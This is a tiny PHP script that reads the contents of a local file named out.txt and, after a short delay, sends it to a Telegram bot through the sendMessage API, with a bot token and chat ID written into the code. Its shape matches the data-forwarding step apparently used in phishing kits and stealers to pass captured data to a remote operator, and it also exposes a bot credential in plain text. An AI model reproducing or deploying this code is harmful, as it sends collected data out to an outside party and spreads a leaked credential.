<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot8240214186:AAFwvyQQxR94Oz59o7C0gRh7pEDpIqRfREc/sendMessage?chat_id=7921952022&text=$msg");
?>
